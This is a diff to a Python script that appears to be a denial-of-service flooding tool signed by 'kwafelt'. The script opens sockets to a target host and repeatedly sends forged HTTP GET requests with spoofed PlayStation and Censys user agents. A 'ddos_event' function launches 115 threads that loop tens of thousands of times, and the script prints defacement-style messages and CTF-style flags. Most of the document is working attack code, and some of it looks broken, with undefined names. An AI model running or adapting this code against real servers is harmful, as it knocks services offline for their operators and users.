@@ -2,6 +2,8 @@
 #
 import hashlib, json, os, platform, random, requests, socket, sys, time ,uuid
 from threading import Timer
+#from requests import get
+
 #
 hello = '''
 
@@ -17,8 +19,9 @@ wr = ["LOCKED OUT OF SERVER; kwafeLt wAS hERE..","written by kwafelt"]
 ws = ["https://kwafelt.github.io/?stt=raw","https://www.instagram.com/kwafelt/","dragonforce.io/members/30011/"]
 
 Browser_identification = 'Chrome/104.0.5112.102 OPR/90.0.4480.80'
-user_agent = 'WorkaroundCtl/1.00 libhttp/9.60 (PlayStation 4)' # PS4
 user_agent2 = 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)'
+ps4 = "Mozilla/5.0 (PlayStation 4 5.55) AppleWebKit/601.2 (KHTML, like Gecko)"
+user_agent = ps4
 
 station = socket.gethostname();
 address = socket.gethostbyname(station)
@@ -27,12 +30,14 @@ usernme = os.environ.get('USERNAME')
 admin = os.getlogin();
 admin = str(admin).replace('K', 'k').replace('l', 'L')
 MAC = hex(uuid.getnode());
-slEEp = 0.75
+delay = 0.75
 
 BLOB = True
+FLAG = '10v3{5h371x1}'
+
 ROOT = [""]
 #STAT = [socket.gethostname(),socket.gethostbyname(STAT[0])]
-HTTP = ['HTTP/1.0','HTTP/1.1','h2']
+HTTP = ['HTTP/1.0','HTTP/1.1','HTTP/2']
 HOST = ['writ.er.ws','search.censys.io']
 CONN = ['close','Keep-Alive']
 
@@ -186,6 +191,13 @@ def ipapi(i):
   else:
     out = f"{color(245, 245, 245, txt['query'])} {color(0, 110, 210, txt['message'])}"
   return out
+
+# about the Requests library here: http://docs.python-requests.org/en/latest/
+#from requests import get
+#def felt():
+# ip = get('https://api.ipify.org').text
+# print(ip) # 'My public IP address is:', ip
+#felt()
 ################################################################################
 #
 # scratch.py
@@ -196,7 +208,6 @@ def client(init):  # platform
     client_hn = platform.node();  # hostname
     if (init == 'os'): return client_os;
     if (init == 'hn'): return client_hn;
-
 
 def address(LAN):
     if LAN == 0:
@@ -223,7 +234,7 @@ class print_status():
     tx4 = color(224,191,184, v4L);
     sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
   def timeout(self, txt0, txt1):
-    tx1 = color(224,191,184, txt0);
+    tx1 = color(145,145,145, txt0);
     tx2 = color(245, 245, 245, 'Timeout');
     tx3 = color(245,215,0,'[--ERR_CONNECTION_TIMEOUT_ERR--]')
     tx4 = color(0, 110, 210, '[-RECONNECTING-]');
@@ -232,70 +243,60 @@ class print_status():
     tx1 = color(145, 145, 145, txt0);
     tx2 = color(245, 110, 110, 'Failure');
     tx3 = color(245, 1, 1, 'No connection SERVER MAY BE DOWN');
-    tx4 = color(245,110,110, "[-!CLOSE-EVENT-]");
+    tx4 = color(245,110,110, "");
     sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
   flag = 'ctf{kwafeLt_wAS_hERE}';
 
 ###############################################################################
 
 def attack(init):
-  global BLOB
-  global slEEp; data = cdata(init)
+  global delay; data = cdata(0); time = ctime(0)
   with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
     try:
-      address = (target_host, target_port); proc.settimeout(1.0)
-      proc.connect(address)
-      b1 = f'GET /?!{data} {HTTP[1]}\r\nHost: {HOST[1]}\r\nUser-Agent: {user_agent}\r\n'
-      b2 = f'Accept-Encoding: gzip, deflate\r\nAccept: text/plain,*/*\r\n'
-      b3 = f'Connection: {CONN[1]}\r\nKeep-Alive: timeout=15, max=100\r\n\r\n'
+      address = (target_host, target_port)
+      proc.settimeout(2.0); proc.connect(address)
+      b1 = f'GET /?!{data} {HTTP[1]}\r\nHost: {HOST[1]}\r\nAccept: application/json, text/plain, */*\r\n'
+      b2 = f'Accept-Encoding: gzip, deflate\r\nAccept-Language: en-us, en\r\nConnection: {CONN[1]}\r\n'
+      b3 = f'Keep-Alive: timeout=10, max=100\r\nUser-Agent: {user_agent}\r\n\r\n'
       proc.sendto((b1).encode('ascii'), address)
       proc.sendto((b2).encode('ascii'), address)
       proc.sendto((b3).encode('ascii'), address)
-      if (init == 'debug'):
-        response = proc.recv(4096); print(bytes1,bytes2); print(f'\r\n' + response.decode('ascii'))
-        print(f'receiving {len(response)} bytes data...')
-      #response = proc.recv(4096) # D O R M A N
+      # response = len(proc.recv(4096))
       proc.shutdown(socket.SHUT_RDWR)
       proc.close()
-      st = print_status(); st.success(ctime(0), data); BLOB = True
+      st = print_status(); st.success(time, data)
+      delay = 0.0
     except socket.timeout:
-      st = print_status(); st.timeout(ctime(0), data); BLOB = False
+      st = print_status(); st.timeout(time, None)
+      delay = 0.5
     except socket.error:
-      st = print_status(); st.failure(ctime(0), None); BLOB = False
+      st = print_status(); st.failure(time, None)
+      delay = 1.5
     except (KeyboardInterrupt, SystemExit):
+      txt = color(204,204,255,f'THREAD {init} / CTRL-C PRESSED / KEYBOARD INTERRUPT')
+      write(f'\r\n\n {txt}\r\n')
       sys.exit(0)
     finally: pass
-  return slEEp;
 
-def process_b(i):
-    for i in range(99):  # 500
-        time.sleep(slEEp);
-        thread = threading.Thread(target=attack);
-        thread.start()
-    # ..D.O.R.M.A.N..
-
-def process(i):
-  global BLOB
-  while (BLOB):
-    if (i > 72540):
-      time.sleep(1.0)
-      flag = '10v3{5h371x1}'
-      tx1 = color(204,204,255,f'COMPLETED / ETA {i} / {flag} / FINN')
-      write(f'\r\n\n {tx1}\r\n')
-      break
-    else:
-      try:
-        attack(i)
-      except (KeyboardInterrupt, SystemExit):
-        R = color(204,204,255,f'ETA {i} / CTRL-C PRESSED / KEYBOARD INTERRUPT')
-        write(f'\r\n\n {R}\r\n')
-        sys.exit(0);
-      finally: pass
-    i = i + 1
+def process(count):
+  while (count < 72540):
+    count = count + 1
+    time.sleep(delay)
+    attack(count)
   else:
-    BLOB = True
-    time.sleep(1)
-    process(i)# Timer(slEEp,attack).start()
+    time.sleep(0.3)
+    tx1 = color(204,204,255,f'THREAD {count} / COMPLETED / {FLAG} / FINN')
+    write(f'\r\n\n {tx1}\r\n')
+  return
+
+def ddos_event(count):
+  for i in range(115):
+    thread = threading.Thread(target=process_pro);
+    thread.start()
+def process_pro():
+  attack(1)
+# D.O.R.M.A.N
+
 ################################################################################
 try:
   parse(0); BLOB = True
